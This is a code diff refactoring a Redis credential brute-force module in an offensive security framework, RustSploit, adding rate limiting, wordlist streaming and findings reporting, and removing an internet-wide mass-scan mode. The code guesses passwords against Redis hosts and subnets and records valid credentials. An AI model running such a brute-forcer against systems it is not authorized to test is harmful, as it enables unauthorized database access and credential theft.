@@ -1,18 +1,30 @@
-use anyhow::{anyhow, Result};
+use anyhow::{ anyhow, Context, Result };
 use colored::*;
-use std::io::{Read, Write};
+use std::io::{ Read, Write };
 use std::net::IpAddr;
 use std::time::Duration;
 
+use crate::module::{ ModuleCtx, ModuleOutcome };
 use crate::utils::{
-    load_lines, get_filename_in_current_dir, cfg_prompt_default, cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_int_range,
+    load_lines,
+    get_filename_in_current_dir,
+    cfg_prompt_default,
+    cfg_prompt_yes_no,
+    cfg_prompt_existing_file,
+    cfg_prompt_int_range,
     cfg_prompt_output_file,
 };
+use crate::utils::wordlist;
 use crate::utils::{
-    BruteforceConfig, LoginResult, SubnetScanConfig,
-    generate_combos_mode, parse_combo_mode, load_credential_file,
-    run_bruteforce, run_subnet_bruteforce,
-    is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
+    BruteforceConfig,
+    LoginResult,
+    SubnetScanConfig,
+    generate_combos_mode,
+    parse_combo_mode,
+    load_credential_file,
+    run_bruteforce,
+    run_subnet_bruteforce,
+    is_subnet_target,
 };
 
 // ============================================================================
@@ -62,6 +74,7 @@ pub fn info() -> crate::module_info::ModuleInfo {
         ],
         disclosure_date: None,
         rank: crate::module_info::ModuleRank::Normal,
+        default_port: Some(6379),
     }
 }
 
@@ -149,112 +162,13 @@ impl RedisError {
 // Module Entry Point
 // ============================================================================
 
-pub async fn run(target: &str) -> Result<()> {
+pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
+    let target = ctx
+        .target
+        .as_single()
+        .context("redis_bruteforce requires a single-host target")?;
     crate::mprintln!("\n{}", "=== Redis Bruteforce Module (RustSploit) ===".bold().cyan());
     crate::mprintln!();
-
-    // --- Mass Scan Mode ---
-    if is_mass_scan_target(target) {
-        crate::mprintln!("{}", format!("[*] Target: {}", target).cyan());
-        crate::mprintln!("{}", "[*] Mode: Mass Scan / Hose".yellow());
-
-        let use_acl = cfg_prompt_yes_no("use_acl", "Use ACL mode? (Redis 6+ username+password)", false).await?;
-
-        return run_mass_scan(target, MassScanConfig {
-            protocol_name: "Redis",
-            default_port: DEFAULT_REDIS_PORT,
-            state_file: "redis_hose_state.log",
-            default_output: "redis_mass_results.txt",
-            default_concurrency: 200,
-        }, move |ip: IpAddr, port: u16| {
-            async move {
-                // Quick TCP check
-                if !crate::utils::tcp_port_open(ip, port, Duration::from_secs(3)).await {
-                    return None;
-                }
-
-                let target_str = ip.to_string();
-
-                // Verify Redis is reachable with PING
-                let ping_result = tokio::task::spawn_blocking({
-                    let t = target_str.clone();
-                    move || redis_ping(&t, port, 5)
-                }).await;
-
-                match ping_result {
-                    Ok(Ok(true)) => {
-                        // PING succeeded without auth — Redis has no auth
-                        let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
-                        {
-                            let id = crate::cred_store::store_credential(
-                                &target_str, port, "redis", "", "(no auth)",
-                                crate::cred_store::CredType::Password,
-                                "creds/generic/redis_credcheck",
-                            ).await;
-                            if id.is_none() { crate::meprintln!("[!] Failed to store credential"); }
-                        }
-                        return Some(format!("[{}] {}:{}:(no auth)\n", ts, ip, port));
-                    }
-                    Ok(Ok(false)) => {
-                        // Auth required, try defaults
-                    }
-                    _ => return None, // Connection failure
-                }
-
-                if use_acl {
-                    for (user, pass) in DEFAULT_ACL_CREDENTIALS {
-                        let t = target_str.clone();
-                        let u = user.to_string();
-                        let p = pass.to_string();
-                        let res = tokio::task::spawn_blocking(move || {
-                            attempt_redis_login(&t, port, &u, &p, true, 5)
-                        }).await;
-                        match res {
-                            Ok(Ok(true)) => {
-                                let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
-                                {
-                                    let id = crate::cred_store::store_credential(
-                                        &target_str, port, "redis", user, pass,
-                                        crate::cred_store::CredType::Password,
-                                        "creds/generic/redis_credcheck",
-                                    ).await;
-                                    if id.is_none() { crate::meprintln!("[!] Failed to store credential"); }
-                                }
-                                return Some(format!("[{}] {}:{}:{}:{}\n", ts, ip, port, user, pass));
-                            }
-                            Ok(Ok(false)) => continue,
-                            _ => return None,
-                        }
-                    }
-                } else {
-                    for pass in DEFAULT_PASSWORDS {
-                        let t = target_str.clone();
-                        let p = pass.to_string();
-                        let res = tokio::task::spawn_blocking(move || {
-                            attempt_redis_login(&t, port, "", &p, false, 5)
-                        }).await;
-                        match res {
-                            Ok(Ok(true)) => {
-                                let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
-                                {
-                                    let id = crate::cred_store::store_credential(
-                                        &target_str, port, "redis", "", pass,
-                                        crate::cred_store::CredType::Password,
-                                        "creds/generic/redis_credcheck",
-                                    ).await;
-                                    if id.is_none() { crate::meprintln!("[!] Failed to store credential"); }
-                                }
-                                return Some(format!("[{}] {}:{}::{}\n", ts, ip, port, pass));
-                            }
-                            Ok(Ok(false)) => continue,
-                            _ => return None,
-                        }
-                    }
-                }
-                None
-            }
-        }).await;
-    }
 
     // --- Subnet Scan Mode ---
     if is_subnet_target(target) {
@@ -264,12 +178,30 @@ pub async fn run(target: &str) -> Result<()> {
         let port = cfg_prompt_int_range("port", "Port", DEFAULT_REDIS_PORT as i64, 1, 65535).await? as u16;
 
         let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
-        let passes = load_lines(&passwords_file)?;
+        let passes = if wordlist::should_stream(&passwords_file) {
+            let mut lines = Vec::new();
+            let mut reader = wordlist::BatchedReader::open(&passwords_file).await?;
+            while let Some(batch) = reader.next_batch().await? {
+                lines.extend(batch);
+            }
+            lines
+        } else {
+            load_lines(&passwords_file)?
+        };
         if passes.is_empty() { return Err(anyhow!("Password list empty")); }
 
         let users = if use_acl {
             let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
-            let u = load_lines(&usernames_file)?;
+            let u = if wordlist::should_stream(&usernames_file) {
+                let mut lines = Vec::new();
+                let mut reader = wordlist::BatchedReader::open(&usernames_file).await?;
+                while let Some(batch) = reader.next_batch().await? {
+                    lines.extend(batch);
+                }
+                lines
+            } else {
+                load_lines(&usernames_file)?
+            };
             if u.is_empty() { return Err(anyhow!("User list empty")); }
             u
         } else {
@@ -283,7 +215,9 @@ pub async fn run(target: &str) -> Result<()> {
 
         let connection_timeout: u64 = 5;
 
-        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
+        let limiter = ctx.limiter.clone();
+        let module_path = ctx.module_path.clone();
+        let hits = run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
             concurrency,
             verbose,
             output_file,
@@ -291,9 +225,13 @@ pub async fn run(target: &str) -> Result<()> {
             jitter_ms: 50,
             source_module: "creds/generic/redis_credcheck",
             skip_tcp_check: false,
+            state_file: None,
         }, move |ip: IpAddr, port: u16, user: String, pass: String| {
+            let limiter = limiter.clone();
+            let module_path = module_path.clone();
             async move {
                 let target_str = ip.to_string();
+                limiter.acquire(&module_path, &target_str).await;
                 let res = tokio::task::spawn_blocking(move || {
                     attempt_redis_login(&target_str, port, &user, &pass, use_acl, connection_timeout)
                 }).await;
@@ -310,7 +248,22 @@ pub async fn run(target: &str) -> Result<()> {
                     },
                 }
             }
-        }).await;
+        }).await?;
+        let mut outcome = ModuleOutcome::ok();
+        for (host, user, pass) in &hits {
+            outcome.findings.push(crate::module::Finding {
+                target: host.clone(),
+                kind: crate::module::FindingKind::Credential,
+                message: format!("Valid Redis credentials found: {}:{}", user, pass),
+                data: Some(serde_json::json!({
+                    "username": user,
+                    "password": pass,
+                    "service": "redis",
+                    "port": port,
+                })),
+            });
+        }
+        return Ok(outcome);
     }
 
     // --- Single Target Mode ---
@@ -359,23 +312,78 @@ pub async fn run(target: &str) -> Result<()> {
 
     crate::mprintln!("\n{}", format!("[*] Starting brute-force on {}:{}", target, port).cyan());
 
+    // Pre-flight: PING the target. If Redis returns +PONG without authentication
+    // we can skip the brute force entirely — the instance is already wide open.
+    let mut outcome = ModuleOutcome::ok();
+    {
+        let target_owned = target.to_string();
+        let pre_timeout = connection_timeout;
+        ctx.rate_limit(target).await;
+        let ping_result = tokio::task::spawn_blocking(move || {
+            redis_ping(&target_owned, port, pre_timeout)
+        })
+        .await;
+        match ping_result {
+            Ok(Ok(true)) => {
+                crate::mprintln!(
+                    "{}",
+                    format!("[+] {}:{} responded +PONG without auth — no credentials required.",
+                        target, port).green().bold()
+                );
+                crate::workspace::add_note(
+                    target,
+                    "[redis_bruteforce] unauthenticated +PONG received; skipping brute force",
+                ).await;
+                outcome.findings.push(crate::module::Finding {
+                    target: target.to_string(),
+                    kind: crate::module::FindingKind::Vulnerable,
+                    message: format!("Redis {}:{} unauthenticated — no credentials required", target, port),
+                    data: Some(serde_json::json!({"service": "redis", "port": port})),
+                });
+                return Ok(outcome);
+            }
+            Ok(Ok(false)) => {
+                crate::mprintln!("{}", "[*] Redis returned -NOAUTH; authentication required.".dimmed());
+            }
+            Ok(Err(e)) => {
+                tracing::debug!(host = %target, "redis ping failed: {}", e.message);
+            }
+            Err(e) => {
+                tracing::debug!(host = %target, "redis ping task panic: {}", e);
+            }
+        }
+    }
+
     // Load wordlists
     let mut usernames = Vec::new();
     let mut passwords = Vec::new();
 
-    if use_acl {
-        if let Some(ref file) = usernames_file {
-            usernames = load_lines(file)?;
+    if use_acl
+        && let Some(ref file) = usernames_file {
+            if wordlist::should_stream(file) {
+                let mut reader = wordlist::BatchedReader::open(file).await?;
+                while let Some(batch) = reader.next_batch().await? {
+                    usernames.extend(batch);
+                }
+            } else {
+                usernames = load_lines(file)?;
+            }
             if usernames.is_empty() {
                 crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
             } else {
                 crate::mprintln!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
             }
         }
-    }
 
     if let Some(ref file) = passwords_file {
-        passwords = load_lines(file)?;
+        if wordlist::should_stream(file) {
+            let mut reader = wordlist::BatchedReader::open(file).await?;
+            while let Some(batch) = reader.next_batch().await? {
+                passwords.extend(batch);
+            }
+        } else {
+            passwords = load_lines(file)?;
+        }
         if passwords.is_empty() {
             crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
         } else {
@@ -425,8 +433,13 @@ pub async fn run(target: &str) -> Result<()> {
         combos.extend(load_credential_file(&cred_path)?);
     }
 
+    let limiter = ctx.limiter.clone();
+    let module_path = ctx.module_path.clone();
     let try_login = move |t: String, p: u16, user: String, pass: String| {
+        let limiter = limiter.clone();
+        let module_path = module_path.clone();
         async move {
+            limiter.acquire(&module_path, &t).await;
             let res = tokio::task::spawn_blocking(move || {
                 attempt_redis_login(&t, p, &user, &pass, use_acl, connection_timeout)
             }).await;
@@ -461,6 +474,23 @@ pub async fn run(target: &str) -> Result<()> {
     result.print_found();
     if let Some(ref path) = save_path {
         result.save_to_file(path)?;
+    }
+
+    // Surface every discovered credential as a Finding (was previously printed
+    // and saved but never pushed into the outcome, so the scheduler/LootStore
+    // never saw brute-forced Redis creds).
+    for (host, user, pass) in &result.found {
+        outcome.findings.push(crate::module::Finding {
+            target: host.clone(),
+            kind: crate::module::FindingKind::Credential,
+            message: format!("Valid Redis credentials found: {}:{}", user, pass),
+            data: Some(serde_json::json!({
+                "username": user,
+                "password": pass,
+                "service": "redis",
+                "port": port,
+            })),
+        });
     }
 
     // Unknown / errored attempts
@@ -516,7 +546,7 @@ pub async fn run(target: &str) -> Result<()> {
         }
     }
 
-    Ok(())
+    Ok(outcome)
 }
 
 // ============================================================================
@@ -655,3 +685,5 @@ fn attempt_redis_login(
         message: format!("Unexpected AUTH response: {}", response.trim()),
     })
 }
+
+crate::register_native_module!(crate::module::Category::Creds, "generic/redis_bruteforce", native);
